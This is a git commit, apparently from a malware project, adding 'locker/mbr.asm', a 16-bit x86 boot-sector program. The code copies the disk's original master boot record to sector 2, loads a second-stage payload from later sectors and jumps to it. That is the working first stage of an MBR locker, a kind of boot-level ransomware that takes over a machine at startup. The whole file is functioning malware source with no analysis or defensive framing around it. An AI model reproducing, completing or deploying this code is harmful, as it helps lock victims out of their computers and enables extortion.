d0338e24318ea3aca307a27f0618905c6497f529
Virusodel <134794046+Virusodel@users.noreply.github.com>
2026-08-11 10:47:32 +0300

    mbr.asm

---
+++ locker/mbr.asm
@@ -0,0 +1,82 @@
+BITS 16
+ORG 0x7C00
+
+start:
+    cli
+    cld
+    xor ax, ax
+    mov ds, ax
+    mov es, ax
+    mov ss, ax
+    mov sp, 0x7C00
+    sti
+
+    call save_mbr
+
+    mov ax, 0x0000
+    mov es, ax
+    mov bx, 0x8000
+    mov ah, 0x02
+    mov al, 8
+    mov ch, 0
+    mov cl, 3
+    mov dh, 0
+    mov dl, 0x80
+    int 0x13
+    jc load_error
+
+    jmp 0x0000:0x8000
+
+load_error:
+    mov si, msg_error
+    call print
+    jmp hang
+
+save_mbr:
+    pusha
+    mov ax, 0x0000
+    mov es, ax
+    mov bx, 0x7E00
+    mov ah, 0x02
+    mov al, 1
+    mov ch, 0
+    mov cl, 1
+    mov dh, 0
+    mov dl, 0x80
+    int 0x13
+    jc .error
+
+    mov ax, 0x0000
+    mov es, ax
+    mov bx, 0x7E00
+    mov ah, 0x03
+    mov al, 1
+    mov ch, 0
+    mov cl, 2
+    mov dh, 0
+    mov dl, 0x80
+    int 0x13
+.error:
+    popa
+    ret
+
+print:
+    lodsb
+    or al, al
+    jz .done
+    mov ah, 0x0E
+    int 0x10
+    jmp print
+.done:
+    ret
+
+hang:
+    cli
+    hlt
+    jmp hang
+
+msg_error:
+    db 'Load error!', 0
+
+times 510 - ($ - $$) db 0
+dw 0xAA55
